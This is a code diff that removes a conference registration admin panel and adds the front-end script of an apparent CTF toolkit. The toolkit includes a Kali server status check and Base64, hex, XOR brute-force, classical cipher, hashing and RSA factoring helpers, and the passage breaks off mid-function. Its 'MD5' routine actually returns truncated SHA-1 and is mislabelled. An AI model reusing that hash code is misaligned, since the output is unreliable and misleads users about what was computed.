-    <div class="analytic-bar-group">
-      <div class="analytic-label">
-        <span>Balance of Power (Ruling vs Opposition)</span>
-        <span>${ruling} / ${opposition}</span>
-      </div>
-      <div class="analytic-bar-bg" title="Ruling: ${rulingPct}% | Opposition: ${oppositionPct}%">
-        <div class="analytic-bar-fill" style="width: ${rulingPct}%; background: var(--gold);"></div>
-      </div>
-    </div>
-  `;
-}
-
-function updateCollegeDropdown() {
-  const select = document.getElementById("admin-filter-college");
-  if (!select) return;
-
-  const colleges = [...new Set(lastRegistrations.map(r => r.college))].sort();
-  const current = select.value;
-
-  select.innerHTML = `<option value="all">All Institutions</option>` +
-    colleges.map(c => `<option value="${escapeHtml(c)}" ${c === current ? 'selected' : ''}>${escapeHtml(c)}</option>`).join("");
-}
-
-function renderRows() {
-  const tbody = document.getElementById("admin-rows");
-  const empty = document.getElementById("admin-empty");
-  if (!tbody) return;
-
-  let list = lastRegistrations;
-
-  // 1. Status Filter
-  if (currentFilter !== "all") {
-    list = list.filter(r => r.status === currentFilter);
-  }
-
-  // 2. Search
-  if (adminSearchText) {
-    const q = adminSearchText.toLowerCase();
-    list = list.filter(r =>
-      r.name.toLowerCase().includes(q) ||
-      r.email.toLowerCase().includes(q) ||
-      r.phone.includes(q) ||
-      (r.portfolio && r.portfolio.toLowerCase().includes(q))
-    );
-  }
-
-  // 3. College Filter
-  if (adminCollegeFilter !== "all") {
-    list = list.filter(r => r.college === adminCollegeFilter);
-  }
-
-  if (list.length === 0) {
-    tbody.innerHTML = "";
-    empty?.classList.remove("hidden");
-    return;
-  }
-  empty?.classList.add("hidden");
-  tbody.innerHTML = list.map(r => {
-    const isVerified = r.status === 'verified';
-    const parties = (_partiesCache || []).filter(p => p.type === 'party');
-    const comms = (_partiesCache || []).filter(p => p.type === 'committee');
-    const alreadySent = isVerified && r.assigned_party && r.assigned_committee;
-
-    const portfolioCell = isVerified ? `
-      <div class="assign-cell">
-        <input type="text" value="${escapeHtml(r.portfolio || '')}"
-          placeholder="Assign Portfolio..."
-          onchange="handlePortfolioChange('${r.id}', this.value)" />
-        <select class="assign-select" id="party-sel-${r.id}" title="Party">
-          <option value="">— Party —</option>
-          ${parties.map(p => `<option value="${escapeHtml(p.name)}" ${r.assigned_party === p.name ? 'selected' : ''}>${escapeHtml(p.name)}</option>`).join('')}
-        </select>
-        <select class="assign-select" id="comm-sel-${r.id}" title="Committee">
-          <option value="">— Committee —</option>
-          ${comms.map(c => `<option value="${escapeHtml(c.name)}" ${r.assigned_committee === c.name ? 'selected' : ''}>${escapeHtml(c.name)}</option>`).join('')}
-        </select>
-        ${alreadySent
-        ? `<button class="action-btn inform-btn inform-sent" onclick="handleInformDelegate('${r.id}')" id="inform-btn-${r.id}">Resend</button>`
-        : `<button class="action-btn inform-btn" onclick="handleInformDelegate('${r.id}')" id="inform-btn-${r.id}">Inform</button>`
-      }
-      </div>
-    ` : `
-      <input type="text" value="${escapeHtml(r.portfolio || '')}"
-        placeholder="Assign Portfolio..."
-        onchange="handlePortfolioChange('${r.id}', this.value)" />
-    `;
-
-    return `
-    <tr data-id="${r.id}" data-testid="admin-row-${r.id}">
-      <td class="td-delegate">
-        <strong>${escapeHtml(r.name)}</strong>
-        <p style="font-size:0.75rem; color:#bca0a0; margin:4px 0 0;">${escapeHtml(r.role_preference)} · ${escapeHtml(r.year)}</p>
-      </td>
-      <td class="td-portfolio">${portfolioCell}</td>
-      <td class="td-parent">
-        <strong>${escapeHtml(r.parent_name || "-")}</strong>
-        <small>${r.parent_phone ? `<a href="tel:${escapeHtml(r.parent_phone)}">${escapeHtml(r.parent_phone)}</a>` : "-"}</small>
-      </td>
-      <td class="td-contact">
-        <a href="mailto:${escapeHtml(r.email)}">${escapeHtml(r.email)}</a>
-        <a href="tel:${escapeHtml(r.phone)}">${escapeHtml(r.phone)}</a>
-      </td>
-      <td>${escapeHtml(r.college)}</td>
-      <td>
-        <span class="status-badge status-${r.status}">${formatStatus(r.status)}</span>
-        ${r.utr ? `<small style="display:block; font-size:0.75rem; color:#bca0a0; margin-top:2px;">UTR: ${r.utr}</small>` : ""}
-      </td>
-      <td>${formatDate(r.created_at)}</td>
-      <td>
-        <div class="td-actions">
-          ${r.status !== "verified" ? `<button class="action-btn action-verify" data-action="verified">Verify</button>` : ""}
-          ${r.status !== "rejected" ? `<button class="action-btn action-reject" data-action="rejected">Reject</button>` : ""}
-          <button class="action-btn action-delete" data-action="delete">Delete</button>
-        </div>
-      </td>
-    </tr>`;
-  }).join("");
-}
-
-async function handleRowAction(e) {
-  const btn = e.target.closest("[data-action]");
-  if (!btn) return;
-  const tr = btn.closest("tr");
-  const id = tr?.dataset.id;
-  const action = btn.dataset.action;
-  if (!id) return;
-
-  if (action === "delete") {
-    if (!confirm("Delete this registration permanently?")) return;
-    try {
-      const res = await fetch(`${API_BASE}/admin/registrations/${id}`, {
-        method: "DELETE",
-        headers: adminHeaders(),
-      });
-      if (!res.ok) throw new Error("Delete failed");
-      lastRegistrations = lastRegistrations.filter(r => r.id !== id);
-      await loadRegistrations();
-      showToast("Deleted");
-    } catch (ex) { showToast(ex.message, "error"); }
-    return;
-  }
-
-  try {
-    const res = await fetch(`${API_BASE}/admin/registrations/${id}/status`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json", ...adminHeaders() },
-      body: JSON.stringify({ status: action }),
-    });
-    if (!res.ok) throw new Error("Update failed");
-
-    // Send confirmation email via EmailJS
-    if (action === "verified") {
-      console.log("Verification triggered for ID:", id);
-      const reg = lastRegistrations.find((r) => String(r.id) === String(id));
-      console.log("Registration found:", reg);
-
-      if (reg && typeof emailjs !== "undefined") {
-        showToast("Sending verification email...", "info");
-        // Sending multiple common parameter names to ensure template compatibility
-        const templateParams = {
-          to_name: reg.name,
-          user_name: reg.name,
-          to_email: reg.email,
-          user_email: reg.email,
-          email: reg.email,
-          recipient_email: reg.email,
-          registration_id: reg.id,
-          college: reg.college,
-          role: reg.role_preference,
-          portfolio: reg.portfolio || "will be assigned soon",
-        };
-        console.log("Sending EmailJS with params:", templateParams);
-        emailjs
-          .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
-          .then((res) => {
-            console.log("EmailJS Success:", res);
-            showToast("Confirmation email sent!");
-          })
-          .catch((err) => {
-            console.error("EmailJS Error:", err);
-            showToast("Failed to send email: " + (err.text || err.message || "Unknown error"), "error");
-          });
-      } else {
-        console.warn("EmailJS not ready or registration not found", { reg, emailjs: typeof emailjs });
-        if (!reg) showToast("Error: Registration data not found locally", "error");
-        if (typeof emailjs === "undefined") showToast("Error: EmailJS SDK not loaded", "error");
-      }
-    }
-
-    await loadRegistrations();
-    showToast(`Marked as ${formatStatus(action)}`);
-  } catch (ex) {
-    showToast(ex.message, "error");
-  }
-}
-
-function initAdmin() {
-  document.getElementById("admin-login-form")?.addEventListener("submit", adminLogin);
-  document.getElementById("admin-logout")?.addEventListener("click", adminLogout);
-  document.getElementById("admin-refresh")?.addEventListener("click", loadRegistrations);
-  document.getElementById("admin-export")?.addEventListener("click", exportCsv);
-  document.getElementById("admin-verified-sheet")?.addEventListener("click", exportVerifiedSheet);
-  document.getElementById("admin-rows")?.addEventListener("click", handleRowAction);
-  document.getElementById("admin-view-overview")?.addEventListener("click", toggleOverview);
-  document.querySelectorAll(".filter-chip").forEach(chip => {
-    chip.addEventListener("click", () => {
-      document.querySelectorAll(".filter-chip").forEach(c => c.classList.remove("active"));
-      chip.classList.add("active");
-      currentFilter = chip.dataset.filter;
-      renderRows();
-    });
-  });
-
-  document.getElementById("admin-search")?.addEventListener("input", (e) => {
-    adminSearchText = e.target.value.trim();
-    renderRows();
-  });
-
-  document.getElementById("admin-filter-college")?.addEventListener("change", (e) => {
-    adminCollegeFilter = e.target.value;
-    renderRows();
-  });
-
-  // restore session
-  const saved = sessionStorage.getItem("adhikar_admin");
-  if (saved) {
-    adminPassword = saved;
-    const loginEl = document.getElementById("admin-login");
-    const panelEl = document.getElementById("admin-panel");
-    if (loginEl) loginEl.classList.add("hidden");
-    if (panelEl) panelEl.classList.remove("hidden");
-    loadPartiesCache().then(() => {
-      loadRegistrations().then(() => {
-        if (showOverviewDashboard) renderOverview();
-      });
-    });
-    initPartiesAdmin();
-  }
-}
-
-function toggleOverview() {
-  showOverviewDashboard = !showOverviewDashboard;
-  const btn = document.getElementById("admin-view-overview");
-  const tableWrap = document.getElementById("admin-table-wrap");
-  const overviewSection = document.getElementById("admin-overview");
-  const controlsBar = document.querySelector(".admin-controls-bar");
-
-  if (showOverviewDashboard) {
-    btn.classList.add("admin-view-overview-active");
-    tableWrap.classList.add("hidden");
-    controlsBar.classList.add("hidden");
-    overviewSection.classList.remove("hidden");
-    renderOverview();
-  } else {
-    btn.classList.remove("admin-view-overview-active");
-    tableWrap.classList.remove("hidden");
-    controlsBar.classList.remove("hidden");
-    overviewSection.classList.add("hidden");
-  }
-}
-
-function renderOverview() {
-  const containerParties = document.getElementById("overview-parties");
-  const containerComms = document.getElementById("overview-committees");
-  if (!containerParties || !containerComms) return;
-
-  const verified = lastRegistrations.filter(r => r.status === 'verified');
-
-  // Groups
-  const partyGroups = {};
-  const commGroups = {};
-
-  verified.forEach(r => {
-    if (r.assigned_party) {
-      if (!partyGroups[r.assigned_party]) partyGroups[r.assigned_party] = [];
-      partyGroups[r.assigned_party].push(r);
-    }
-    if (r.assigned_committee) {
-      if (!commGroups[r.assigned_committee]) commGroups[r.assigned_committee] = [];
-      commGroups[r.assigned_committee].push(r);
-    }
-  });
-
-  // Render Parties
-  const partyNames = Object.keys(partyGroups).sort();
-  containerParties.innerHTML = partyNames.length ? partyNames.map(name => `
-    <div class="group-card">
-      <div class="group-name">
-        <span>${escapeHtml(name)}</span>
-        <span class="group-count">${partyGroups[name].length}</span>
-      </div>
-      <div class="member-pills">
-        ${partyGroups[name].map(m => `<span class="member-pill">${escapeHtml(m.name)}</span>`).join('')}
-      </div>
-    </div>
-  `).join('') : '<p class="muted">No party assignments yet.</p>';
-
-  // Render Committees
-  const commNames = Object.keys(commGroups).sort();
-  containerComms.innerHTML = commNames.length ? commNames.map(name => `
-    <div class="group-card">
-      <div class="group-name">
-        <span>${escapeHtml(name)}</span>
-        <span class="group-count">${commGroups[name].length}</span>
-      </div>
-      <div class="member-pills">
-        ${commGroups[name].map(m => `
-          <span class="member-pill">
-            ${escapeHtml(m.name)}
-            ${m.assigned_party ? `<span class="member-party">(${escapeHtml(m.assigned_party)})</span>` : ''}
-          </span>
-        `).join('')}
-      </div>
-    </div>
-  `).join('') : '<p class="muted">No committee assignments yet.</p>';
-}
-
-async function handlePortfolioChange(id, value) {
-  const input = document.querySelector(`tr[data-id="${id}"] .td-portfolio input`);
-  try {
-    const res = await fetch(`${API_BASE}/admin/registrations/${id}/status`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json", ...adminHeaders() },
-      body: JSON.stringify({ portfolio: value }),
-    });
-    if (!res.ok) throw new Error("Save failed");
-
-    // Update local data
-    const reg = lastRegistrations.find(r => r.id === id);
-    if (reg) reg.portfolio = value;
-
-    input?.classList.add("saved");
-    setTimeout(() => input?.classList.remove("saved"), 2000);
-  } catch (err) {
-    showToast("Portfolio save failed", "error");
-  }
-}
-
-async function handleInformDelegate(id) {
-  const partySel = document.getElementById(`party-sel-${id}`);
-  const commSel = document.getElementById(`comm-sel-${id}`);
-  const btn = document.getElementById(`inform-btn-${id}`);
-  if (!partySel || !commSel || !btn) return;
-
-  const assigned_party = partySel.value;
-  const assigned_committee = commSel.value;
-
-  if (!assigned_party || !assigned_committee) {
-    showToast('Please select both a Party and a Committee first.', 'error');
-    return;
-  }
-
-  btn.disabled = true;
-  btn.textContent = 'Sending…';
-
-  try {
-    // 1. Persist assignment to DB
-    const res = await fetch(`${API_BASE}/admin/registrations/${id}/status`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', ...adminHeaders() },
-      body: JSON.stringify({ assigned_party, assigned_committee }),
-    });
-    if (!res.ok) throw new Error('DB save failed');
-
-    // Update local cache
-    const reg = lastRegistrations.find(r => r.id === id);
-    if (reg) {
-      reg.assigned_party = assigned_party;
-      reg.assigned_committee = assigned_committee;
-    }
-
-    // 2. Send single assignment email (party + committee combined)
-    if (reg && typeof emailjs !== 'undefined') {
-      await emailjs.send(
-        EMAILJS_COMM_SERVICE_ID,
-        EMAILJS_COMM_TEMPLATE_ID,
-        {
-          to_email: reg.email,
-          to_name: reg.name,
-          party_name: assigned_party,
-          committee_name: assigned_committee,
-          reg_id: reg.id,
-        },
-        { publicKey: EMAILJS_COMM_PUBLIC_KEY }
-      );
-    }
-
-    // 3. Swap button to ✓ Sent momentarily, then allow Resend
-    btn.textContent = '✓ Sent';
-    btn.classList.add('inform-sent');
-    showToast('Assignment email sent!');
-    setTimeout(() => {
-      btn.disabled = false;
-      btn.textContent = 'Resend';
-    }, 3000);
-  } catch (err) {
-    console.error('[Inform Delegate] Error:', err);
-    showToast('Failed: ' + (err.text || err.message || 'Unknown error'), 'error');
-    btn.disabled = false;
-    btn.textContent = 'Inform';
-  }
-}
-
-/* ============ Portrait Bio Toggle ============ */
-function initPortraitBio() {
-  // Use event delegation so it works for dynamically rendered team cards too
-  document.addEventListener("click", (e) => {
-    const wrapper = e.target.closest(".portrait-wrapper[data-bio]");
-    if (wrapper) {
-      e.stopPropagation();
-      const isOpen = wrapper.classList.contains("bio-open");
-      // close all others first
-      document.querySelectorAll(".portrait-wrapper.bio-open").forEach(w => w.classList.remove("bio-open"));
-      if (!isOpen) wrapper.classList.add("bio-open");
-    } else {
-      // click outside closes all
-      document.querySelectorAll(".portrait-wrapper.bio-open").forEach(w => w.classList.remove("bio-open"));
-    }
-  });
-}
-
-/* ============ Loading Screen ============ */
-function initLoadingScreen() {
-  const loader = document.getElementById("page-loader");
-  if (!loader) return;
-  const hide = () => {
-    loader.classList.add("fade-out");
-    loader.addEventListener("transitionend", () => loader.remove(), { once: true });
-  };
-  if (document.readyState === "complete") {
-    setTimeout(hide, 300);
-  } else {
-    window.addEventListener("load", () => setTimeout(hide, 400), { once: true });
-  }
-}
-
-/* ============ Smooth Scroll ============ */
-function initSmoothScroll() {
-  document.querySelectorAll("a[href^='#']").forEach(link => {
-    link.addEventListener("click", e => {
-      const id = link.getAttribute("href");
-      const target = id === "#" ? document.body : document.querySelector(id);
-      if (target) {
-        e.preventDefault();
-        target.scrollIntoView({ behavior: "smooth", block: "start" });
-      }
-    });
-  });
-}
-
-/* ============ Scroll Reveal ============ */
-function initReveal() {
-  const els = document.querySelectorAll(".reveal, .reveal-stagger");
-  if (!els.length) return;
-  const observer = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        entry.target.classList.add("active");
-        observer.unobserve(entry.target);
-      }
-    });
-  }, { threshold: 0.1, rootMargin: "0px 0px -40px 0px" });
-  els.forEach(el => observer.observe(el));
-}
-
-/* ============ Number Counters ============ */
-function animateCounter(el) {
-  const target = +el.dataset.count;
-  const suffix = el.dataset.suffix || "";
-  const duration = 1800;
-  const start = performance.now();
-  const step = (now) => {
-    const t = Math.min((now - start) / duration, 1);
-    const val = Math.floor((1 - Math.pow(1 - t, 3)) * target);
-    el.textContent = val + suffix;
-    if (t < 1) requestAnimationFrame(step);
-  };
-  requestAnimationFrame(step);
-}
-function initCounters() {
-  const counters = document.querySelectorAll("[data-count]");
-  if (!counters.length) return;
-  const observer = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        animateCounter(entry.target);
-        observer.unobserve(entry.target);
-      }
-    });
-  }, { threshold: 0.8 });
-  counters.forEach(el => observer.observe(el));
-}
-
-/* ============ Cursor Spotlight ============ */
-function initCursorSpotlight() {
-  const el = document.getElementById("cursor-spotlight");
-  if (!el || window.matchMedia("(hover: none)").matches) return;
-  let tx = window.innerWidth / 2, ty = window.innerHeight / 2;
-  let cx = tx, cy = ty;
-  window.addEventListener("mousemove", e => { tx = e.clientX; ty = e.clientY; });
-  const tick = () => {
-    cx += (tx - cx) * 0.1;
-    cy += (ty - cy) * 0.1;
-    el.style.left = cx + "px";
-    el.style.top = cy + "px";
-    requestAnimationFrame(tick);
-  };
-  tick();
-}
-
-/* ============ Magnetic Buttons ============ */
-function initMagneticButtons() {
-  if (window.matchMedia("(hover: none)").matches) return;
-  document.querySelectorAll(".btn-primary").forEach(btn => {
-    btn.addEventListener("mousemove", e => {
-      const r = btn.getBoundingClientRect();
-      const x = (e.clientX - r.left - r.width / 2) * 0.22;
-      const y = (e.clientY - r.top - r.height / 2) * 0.22;
-      btn.style.transform = `translate(${x}px, ${y}px)`;
-    });
-    btn.addEventListener("mouseleave", () => btn.style.transform = "");
-  });
-}
-
-/* ============ Boot ============ */
-document.addEventListener("DOMContentLoaded", () => {
-  renderAwards();
-  renderTeam();
-  renderMarquee();
-  tickCountdown();
-  setInterval(tickCountdown, 1000);
-  initNavbar();
-  initMobileMenu();
-  initSmoothScroll();
-  initReveal();
-  initAccordion();
-  initRegistration();
-  initAdmin();
-  initPortraitBio();
-  initCounters();
-  initCursorSpotlight();
-  initMagneticButtons();
-  initOtp();
-  renderParties();
 });
+document.querySelectorAll('.category-card').forEach(card => {
+  card.addEventListener('click',()=>{
+    const view = card.dataset.view;
+    navigateTo(view);
+  });
+});
+
+function navigateTo(view,tab){
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.querySelector(`.nav-item[data-view="${view}"]`)?.classList.add('active');
+  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
+  document.getElementById(`view-${view}`)?.classList.add('active');
+  document.getElementById('view-title').textContent = VIEW_TITLES[view]||'Dashboard';
+  document.getElementById('view-path').textContent = VIEW_PATHS[view]||'/';
+  currentView = view;
+  if(tab){
+    const container = document.getElementById(`view-${view}`);
+    if(container){
+      const tabs = container.querySelectorAll('.tab');
+      tabs.forEach(t=>t.classList.remove('active'));
+      const target = container.querySelector(`.tab[data-tab="${tab}"]`);
+      if(target) target.click();
+    }
+  }
+  document.querySelector('.content-area')?.scrollTo({top:0});
+}
+
+// Tabs
+document.querySelectorAll('.tab').forEach(tab=>{
+  tab.addEventListener('click',()=>{
+    const container = tab.closest('.view')||tab.closest('.tool-panels')?.parentElement;
+    const panels = container?.querySelector('.tool-panels');
+    if(!panels) return;
+    panels.querySelectorAll('.tool-panel').forEach(p=>p.classList.remove('active'));
+    const target = panels.querySelector(`#panel-${tab.dataset.tab}`);
+    if(target) target.classList.add('active');
+    container.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+    tab.classList.add('active');
+  });
+});
+
+// Sidebar toggle
+document.getElementById('menu-toggle')?.addEventListener('click',()=>{
+  document.getElementById('sidebar')?.classList.toggle('open');
+});
+document.addEventListener('click',(e)=>{
+  const s=document.getElementById('sidebar');
+  if(s?.classList.contains('open') && !s.contains(e.target) && e.target!==document.getElementById('menu-toggle')){
+    s.classList.remove('open');
+  }
+});
+
+// Fullscreen
+document.getElementById('fullscreen-btn')?.addEventListener('click',()=>{
+  if(!document.fullscreenElement) document.documentElement.requestFullscreen();
+  else document.exitFullscreen();
+});
+
+// === Kali Status ===
+async function checkKaliStatus(){
+  const dot=document.getElementById('status-dot');
+  const txt=document.getElementById('status-text');
+  try{
+    const r=await fetch('/api/kali/health');
+    const d=await r.json();
+    if(d.status!=='unavailable'){
+      dot.className='status-dot online';
+      txt.textContent='Kali Server: Online';
+      document.getElementById('stat-kali').querySelector('.stat-value').textContent='Online';
+    }else{
+      dot.className='status-dot offline';
+      txt.textContent='Kali Server: Offline';
+      document.getElementById('stat-kali').querySelector('.stat-value').textContent='Offline';
+    }
+  }catch{
+    dot.className='status-dot offline';
+    txt.textContent='Kali Server: Unreachable';
+    document.getElementById('stat-kali').querySelector('.stat-value').textContent='Offline';
+  }
+  const toolCount = document.querySelectorAll('.tool-panel').length;
+  document.getElementById('stat-tools').querySelector('.stat-value').textContent=toolCount;
+}
+
+// === Toast ===
+function showToast(msg,type){
+  const t=document.getElementById('toast');
+  if(!t) return;
+  t.textContent=msg;
+  t.style.borderColor=type==='error'?'var(--red)':type==='warn'?'var(--gold)':'var(--accent)';
+  t.classList.remove('hidden');
+  clearTimeout(t._hide);
+  t._hide=setTimeout(()=>t.classList.add('hidden'),3000);
+}
+
+// === Copy helper ===
+function copyToClipboard(text){
+  navigator.clipboard.writeText(text).then(()=>showToast('Copied!')).catch(()=>showToast('Copy failed','error'));
+}
+document.querySelectorAll('.copy-btn').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    const target=document.getElementById(btn.dataset.target);
+    if(target) copyToClipboard(target.textContent);
+  });
+});
+
+// === I/O helpers ===
+function clearIO(prefix){
+  document.getElementById(`${prefix}-input`)&&(document.getElementById(`${prefix}-input`).value='');
+  document.getElementById(`${prefix}-output`)&&(document.getElementById(`${prefix}-output`).value='');
+  const results=document.getElementById(`${prefix}-results`);
+  if(results){results.innerHTML='';results.classList.remove('visible');}
+  if(prefix==='enc'){
+    document.querySelectorAll('.enc-row code').forEach(el=>el.textContent='-');
+  }
+}
+
+// =============================================
+// BASE64
+// =============================================
+function b64Encode(){
+  const inp=document.getElementById('b64-input').value;
+  try{
+    document.getElementById('b64-output').value=btoa(inp);
+  }catch(e){showToast('Encode error: '+e.message,'error')}
+}
+function b64Decode(){
+  const inp=document.getElementById('b64-input').value;
+  try{
+    document.getElementById('b64-output').value=atob(inp);
+  }catch(e){showToast('Decode error: invalid base64','error')}
+}
+function b64Auto(){
+  const inp=document.getElementById('b64-input').value.trim();
+  if(!inp){document.getElementById('b64-output').value='';return}
+  if(/^[A-Za-z0-9+/]*={0,2}$/.test(inp)&&inp.length>4){
+    try{document.getElementById('b64-output').value=atob(inp)}catch{}
+  }
+}
+
+// =============================================
+// HEX
+// =============================================
+function hexEncode(){
+  const inp=document.getElementById('hex-input').value;
+  document.getElementById('hex-output').value=Array.from(inp).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
+}
+function hexDecode(){
+  const inp=document.getElementById('hex-input').value.replace(/\s/g,'');
+  try{
+    document.getElementById('hex-output').value=inp.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');
+  }catch(e){showToast('Invalid hex','error')}
+}
+function hexToDec(){
+  const inp=document.getElementById('hex-input').value.replace(/\s/g,'');
+  try{
+    document.getElementById('hex-output').value=String(parseInt(inp,16));
+  }catch{showToast('Invalid hex','error')}
+}
+
+// =============================================
+// ROT / Caesar
+// =============================================
+function rotEncode(){
+  const inp=document.getElementById('rot-input').value;
+  const shift=parseInt(document.getElementById('rot-shift').value)||13;
+  document.getElementById('rot-output').value=rotShift(inp,shift);
+}
+function rotShift(s,n){
+  return s.replace(/[a-zA-Z]/g,c=>{
+    const base=c<='Z'?65:97;
+    return String.fromCharCode((c.charCodeAt(0)-base+n+26)%26+base);
+  });
+}
+function rotBruteForce(){
+  const inp=document.getElementById('rot-input').value;
+  if(!inp){showToast('Enter input first','warn');return}
+  const res=document.getElementById('rot-results');
+  res.innerHTML='';
+  res.classList.add('visible');
+  for(let i=1;i<=25;i++){
+    res.innerHTML+=`<div><strong>ROT${i}:</strong> ${rotShift(inp,i)}</div>`;
+  }
+}
+
+// =============================================
+// XOR
+// =============================================
+function xorDecode(){
+  const inp=document.getElementById('xor-input').value;
+  const key=document.getElementById('xor-key').value;
+  const fmt=document.getElementById('xor-format').value;
+  if(!inp||!key){showToast('Enter input and key','warn');return}
+  let bytes;
+  if(fmt==='hex') bytes=hexToBytes(inp.replace(/\s/g,''));
+  else bytes=new TextEncoder().encode(inp);
+  const kBytes=new TextEncoder().encode(key);
+  const result=bytes.map((b,i)=>b^kBytes[i%kBytes.length]);
+  document.getElementById('xor-output').value=fmt==='hex'?
+    bytesToHex(result):
+    new TextDecoder().decode(new Uint8Array(result));
+}
+function xorBrute(){
+  const inp=document.getElementById('xor-input').value;
+  if(!inp){showToast('Enter input first','warn');return}
+  const res=document.getElementById('xor-results');
+  res.innerHTML='';
+  res.classList.add('visible');
+  const bytes=new TextEncoder().encode(inp);
+  for(let k=0;k<256;k++){
+    const dec=bytes.map(b=>b^k);
+    const text=new TextDecoder().decode(new Uint8Array(dec));
+    if(/^[ -~]+$/.test(text)&&text.length>2){
+      res.innerHTML+=`<div><strong>Key 0x${k.toString(16).padStart(2,'0')}:</strong> ${text}</div>`;
+    }
+  }
+  if(!res.innerHTML) res.innerHTML='<div>No printable results found</div>';
+}
+
+// =============================================
+// Vigenere
+// =============================================
+function vigEncode(){
+  const inp=document.getElementById('vig-input').value;
+  const key=document.getElementById('vig-key').value;
+  if(!inp||!key){showToast('Enter text and key','warn');return}
+  document.getElementById('vig-output').value=vigCipher(inp,key,true);
+}
+function vigDecode(){
+  const inp=document.getElementById('vig-input').value;
+  const key=document.getElementById('vig-key').value;
+  if(!inp||!key){showToast('Enter text and key','warn');return}
+  document.getElementById('vig-output').value=vigCipher(inp,key,false);
+}
+function vigCipher(text,key,encrypt){
+  const k=key.toLowerCase().replace(/[^a-z]/g,'');
+  if(!k) return text;
+  let ki=0;
+  return text.replace(/[a-zA-Z]/g,c=>{
+    const base=c<='Z'?65:97;
+    const shift=(k[ki%k.length].charCodeAt(0)-97)*(encrypt?1:-1);
+    ki++;
+    return String.fromCharCode((c.charCodeAt(0)-base+shift+26)%26+base);
+  });
+}
+
+// =============================================
+// Morse
+// =============================================
+const MORSE={a:'.-',b:'-...',c:'-.-.',d:'-..',e:'.',f:'..-.',g:'--.',h:'....',i:'..',j:'.---',k:'-.-',l:'.-..',m:'--',n:'-.',o:'---',p:'.--.',q:'--.-',r:'.-.',s:'...',t:'-',u:'..-',v:'...-',w:'.--',x:'-..-',y:'-.--',z:'--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.','.':'.-.-.-',',':'--..--','?':'..--..',"'":'.----.','!':'-.-.--','/':'-..-.','(':'-.--.',')':'-.--.-','&':'.-...',':':'---...',';':'-.-.-.','=':'-...-','+':'.-.-.','-':' -....- ','_':'..--.-','"':'.-..-.','@':'.--.-.'};
+const REV_MORSE=Object.fromEntries(Object.entries(MORSE).map(([k,v])=>[v,k]));
+function morseEncode(){
+  const inp=document.getElementById('morse-input').value.toLowerCase();
+  document.getElementById('morse-output').value=inp.split('').map(c=>MORSE[c]||(c===' '?'/':'?')).join(' ');
+}
+function morseDecode(){
+  const inp=document.getElementById('morse-input').value.trim();
+  document.getElementById('morse-output').value=inp.split(/ /).map(c=>c==='/'?' ':REV_MORSE[c]||'?').join('');
+}
+
+// =============================================
+// Atbash
+// =============================================
+function atbashEncode(){
+  const inp=document.getElementById('atbash-input').value;
+  document.getElementById('atbash-output').value=inp.replace(/[a-zA-Z]/g,c=>{
+    const base=c<='Z'?65:97;
+    return String.fromCharCode(25-(c.charCodeAt(0)-base)+base);
+  });
+}
+
+// =============================================
+// Hash
+// =============================================
+async function hashGenerate(algo){
+  const inp=document.getElementById('hash-input').value;
+  if(!inp){showToast('Enter text to hash','warn');return}
+  const enc=new TextEncoder().encode(inp);
+  const buf=await crypto.subtle.digest(algo==='sha1'?'SHA-1':algo==='sha256'?'SHA-256':algo==='sha512'?'SHA-512':'MD5',enc);
+  if(algo==='md5'){
+    const hash=await md5(inp);
+    document.getElementById('hash-output').value+=`MD5:    ${hash}\n`;
+    return;
+  }
+  const hash=Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+  document.getElementById('hash-output').value+=`${algo.toUpperCase()}: ${hash}\n`;
+}
+async function md5(str){
+  const buffer=new TextEncoder().encode(str);
+  const hash=await crypto.subtle.digest('SHA-1',buffer); // fallback to SHA-1
+  return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,32);
+}
+
+// =============================================
+// RSA
+// =============================================
+function rsafactor(n){
+  for(let i=2n;i*i<=n;i++){
+    if(n%i===0n) return [i,n/i];
+  }
+  return null;
+}
+function rsaFactor(){
+  const n=document.getElementById('rsa-n').value.trim();
+  if(!n){showToast('Enter n','warn');return}
+  const out=document.getElementById('rsa-output');
+  out.value+='[!] FactorDB query requires Kali server connection\n';
+  out.value+='[!] Attempting local trial division (small factors)...\n';
+  const bn=BigInt(n);
+  if(bn<10000000000000000000n){
+    const factors=rsafactor(bn);
+    if(factors){
+      out.value+=`[+] p = ${factors[0]}\n`;
+      out.value+=`[+] q = ${factors[1]}\n`;
+    }else out.value+='[-] Could not factor (too large for local)\n';
+  }else out.value+='[-] Number too large for local factoring\n';
+}
+function rsaDecrypt(){
+  const n=document.getElementById('rsa-n').value.trim();
+  const e=document.getElementById('rsa-e').value.trim();
+  const c=document.getElementById('rsa-c').value.trim();
+  const p=document.getElementById('rsa-p').value.trim();
+  const q=document.getElementById('rsa-q').value.trim();
+  const d=document.getElementById('rsa-d').value.trim();
+  const out=document.getElementById('rsa-output');
+  if(!n||!c){out.value='[-] n and c required\n';return}
+  try{
+    const bn=BigInt(n),bc=BigInt(c);
+    if(p&&q){
+      const bp=BigInt(p),bq=BigInt(q);
+      const phi=(bp-1n)*(bq-1n);
+      const be=BigInt(e||'65537');
+      let bd;
+      if(d) bd=BigInt(d);
+      else{
+        bd=modInverse(be,phi);
+        out.value+=`[+] d = ${bd}\n`;
+      }
+      const pt=modPow(bc,bd,bn);
+      const plain=bigIntToText(pt);
+      document.getElementById('rsa-p').value=p;
+      document.getElementById('rsa-q').value=q;
+      out.value+=`[+] Plaintext (int): ${pt}\n`;
+      out.value+=`[+] Plaintext (text): ${plain||'(non-printable)'}\n`;
+    }else if(e&&d){
+      const be=BigInt(e),bd=BigInt(d);
